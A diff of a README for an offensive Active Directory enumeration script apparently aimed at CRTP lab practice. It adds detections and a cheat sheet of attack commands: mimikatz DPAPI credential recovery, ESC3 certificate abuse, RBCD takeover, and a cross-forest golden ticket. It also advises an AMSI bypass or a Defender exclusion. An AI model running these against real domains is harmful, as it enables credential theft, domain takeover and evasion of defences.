@@ -42,14 +42,16 @@ flowchart TD
     C --> D{Can it reach a Domain Controller?}
     D -- No --> D1["Warn: not an AD domain - local checks only"]
     D -- Yes --> E[00 · Who am I?<br/>token · privileges · groups]
+    E --> E1[00c · Saved creds<br/>cmdkey · DPAPI blobs]
     E --> F[Quietly enumerate the domain over LDAP]
     F --> F1[Users<br/>kerberoast · AS-REP · secrets<br/>delegation · SID history]
-    F --> F2[Computers<br/>delegation · RBCD · MAQ]
-    F --> F3[Groups · GPO · AD CS ESC1<br/>DCSync · LAPS · gMSA]
+    F --> F2[Computers<br/>delegation · RBCD set + writable · MAQ]
+    F --> F3[Groups · GPO · AD CS ESC1-15<br/>DCSync · LAPS · gMSA]
     F --> F4[ACLs · Trusts · SPNs · MSSQL]
     F --> F5{"-HostSweep ? (louder)"}
     F5 -- yes --> F6[Local-admin · shares · live sessions]
     F1 --> G[Rank findings: HIGH / MED / INFO]
+    E1 --> G
     F2 --> G
     F3 --> G
     F4 --> G
@@ -92,9 +94,12 @@ enumerate  ->  read RECOMMENDED NEXT MOVE  ->  run its command (EXPLOIT_COMMANDS
   - `-Target <host>` — scope them to one box (quiet-ish, ideal per-hop)
 - **Other loud/active options are opt-in too:** `-Roast` (Rubeus, 4769 events),
   `-BloodHound`, `-SharpEnum`, `-WinPEASPath`, `-SQLCrawl`.
-- **AMSI note:** this script contains tool names/commands (mimikatz, kerberoast,
-  dcsync…) that Defender/AMSI may flag when you *load* it — dot-source it inside an
-  InviShell shell or after your AMSI bypass, like your other offensive `.ps1` files.
+- **AMSI / Defender note:** this script embeds tool command *strings* (mimikatz,
+  kerberoast, dcsync…) in its `EXPLOIT_COMMANDS` output, so Defender real-time
+  protection may **quarantine/delete the file the moment you dot-source it**. Load it
+  inside an InviShell shell, after your AMSI bypass, or add a Defender exclusion for your
+  tools folder — like your other offensive `.ps1` files. Syntax-checking is always safe
+  (no execution): `[System.Management.Automation.Language.Parser]::ParseFile('.\Invoke-CRTPEnum.ps1',[ref]$null,[ref]$null)`.
 
 ---
 
@@ -159,7 +164,13 @@ Invoke-CRTPEnum -Target dcorp-appsrv -Quick      # fast re-run scoped to one new
 Invoke-CRTPEnum -WinPEASPath C:\Tools\winPEASx64.exe   # opt-in deep local triage (LOUD)
 Invoke-CRTPEnum -Json                            # also write findings.json (for the cheatsheet / tooling)
 Invoke-CRTPEnum -Zip                             # also zip the whole run folder
+Invoke-CRTPEnum -OwnedPrincipals studvm$,techservice   # flag ACL/RBCD findings YOU can act on
 ```
+
+**`-OwnedPrincipals`** — give it the accounts/computers you already control. The script
+then highlights the ACL and RBCD findings those principals can act on *right now*
+(e.g. "`studvm$` can configure RBCD on MGMTSRV", "`techservice` has ForceChangePassword
+over puretech") and floats them to the top of the recommended next move.
 
 **`-Target`** filters the host-centric sections (computers, shares, sessions) to the
 box(es) you name — run it on each new foothold for a quick pass instead of
@@ -168,9 +179,9 @@ re-sweeping the whole domain every hop.
 **`-Only` / `-Skip`** target or exclude sections by keyword (default = run everything):
 `-Only kerberoast,asrep,acls` runs just those leads; `-Skip gpo,spns` runs all but those.
 `-Skip` wins over `-Only`. Skipped sections don't query at all (so it's also faster).
-Keywords: `context token domain trust forest users kerberoast asrep delegation secrets
-computers rbcd maq groups gpo cpassword adcs esc policy spray dcsync laps acls spns mssql
-privesc local gmsa`. This is the safe version of "only enumerate specific things" — a
+Keywords: `context token creds dpapi cmdkey domain trust forest users kerberoast asrep
+delegation secrets computers rbcd maq groups gpo cpassword adcs esc policy spray dcsync
+laps acls spns mssql privesc local gmsa`. This is the safe version of "only enumerate specific things" — a
 *choice*, not an auto-skip that could hide new access on a re-run.
 
 **`-Credential`** enumerates the directory **as a captured user** through the built-in
@@ -315,18 +326,19 @@ Run just the sections you want (fast, targeted). Keywords are listed under `-Onl
 
 | Section | File | Finds |
 |--------|------|-------|
-| Current context | `00_context` | Your token: SeImpersonate/SeBackup/SeDebug (→ potato/dump), privileged group membership |
+| Current context | `00_context` | Your token: SeImpersonate/SeBackup/SeDebug (→ potato/dump), privileged group membership + **netonly/no-domain-context detection** (reminds you to pass `-Server`/`-dc`) |
 | EDR/AV | `00b_edr` | Defensive products on this host (needs Invoke-EDRChecker) |
-| Domain/Trusts | `01_` | DCs, trust direction, SID-filtering state |
+| **Saved creds** | `00c_saved_creds` | **Credential Manager / `cmdkey` saved creds (e.g. RDP "remember me") + DPAPI credential/vault blobs** → points at `mimikatz dpapi::cred` |
+| Domain/Trusts | `01_` | DCs, trust direction, SID-filtering state + **cross-forest playbook** (trust-key → referral → leaked-cert PKINIT) |
 | Users | `02_`, `02a`, `02b` | Kerberoastable (RC4/AES + `adminCount` priority), AS-REP, no-preauth, PASSWD_NOTREQD, desc/info secrets, delegation, **protocol transition**, **SID history**, adminCount |
-| Computers | `03_` | Unconstrained/constrained delegation, RBCD, **protocol transition**, MachineAccountQuota, legacy OS |
+| Computers | `03_` | Unconstrained/constrained delegation, RBCD (already-set **and** **"RBCD attack available"** — a principal you/low-priv can write → configure it yourself), **protocol transition**, MachineAccountQuota, legacy OS |
 | Priv groups | `04_` | DA/EA/Admins/DnsAdmins/… recursive membership + **AdminSDHolder write rights** + **Protected/operator-group abuse** (Account/Backup/Server/Print Operators, DnsAdmins → SYSTEM/DA, flagged HIGH if your token is a member) |
 | GPO | `05_` | GPO list + auto SYSVOL `cpassword` scan + **GPO edit rights** |
-| AD CS | `06_` | Enterprise CA + **ESC1 vulnerable-template auto-detect (pure LDAP, no Certify)** |
+| AD CS | `06_` | Enterprise CA + **ESC1/2/3/9/13/14/15 template auto-detect (pure LDAP, no Certify)**, per-template enrollment ACLs, HIGH when an owned/low-priv principal can enrol (the ESC3 agent+on-behalf-of pair) |
 | Password policy | `06b_` | minLen / lockout → tells you if spraying is safe |
 | DCSync rights | `06c_` | Non-default principals with replication rights (→ dcsync) + **krbtgt password age** (golden-ticket viability) |
 | LAPS | `06d_` | Local-admin passwords you can read **+ who else is delegated read** |
-| ACLs | `07_` | GenericAll/WriteDacl/WriteOwner (needs PowerView) |
+| ACLs | `07_` | GenericAll/WriteDacl/WriteOwner (needs PowerView); with `-OwnedPrincipals`, tags the ones **you control** as directly actionable (+ LDAP fallback) |
 | Local admin | `08_` | Hosts where you are local admin (needs PowerView) |
 | SPNs/MSSQL | `09_`,`10_` | Service inventory + MSSQL link-crawl targets |
 | Trusted domains | `11_` | (`-IncludeForest`) recon across each trust |
@@ -356,7 +368,11 @@ Unconstrained capture TGTs (Rubeus monitor/triage) + coerce a DC:
               MS-RPRN.exe | WSPCoerce.exe | DFSCoerce-andrea.exe  <listener> <victim-DC>
 Constrained   Rubeus.exe s4u /user: /rc4: /impersonateuser:administrator /msdsspn: /ptt
 RBCD / MAQ>0  Get-RBCD-Threaded.exe / add machine acct -> set msDS-AllowedToActOnBehalfOfOtherIdentity -> Rubeus s4u
+RBCD-write    you can write a computer obj -> Set-ADComputer -PrincipalsAllowedToDelegateToAccount -> Rubeus s4u as a DA
 AD CS ESC1    Certify.exe request /template:<vuln> /altname:administrator -> Rubeus asktgt /certificate
+AD CS ESC3    Certify request /template:<agent> -> request /template:<target> /onbehalfof:<DA> /enrollcert:agent.pfx -> Rubeus asktgt /certificate
+Saved cred    mimikatz sekurlsa::dpapi ; dpapi::cred /in:%localappdata%\Microsoft\Credentials\<blob>  (recovers saved RDP/creds)
+Cross-forest  (after DA) lsadump::trust /patch -> kerberos::golden /service:krbtgt /target:<forest> -> if SID-filtered, grab a leaked cert on their shares -> PKINIT
 gMSA readable read msDS-ManagedPassword (GMSAPasswordReader) -> use NTLM with Rubeus /rc4
 SID history   investigate the injected/foreign SID (existing cross-domain path or persistence)
 AdminSDHolder if you can write it -> add yourself; SDProp re-applies to protected groups = persistent DA
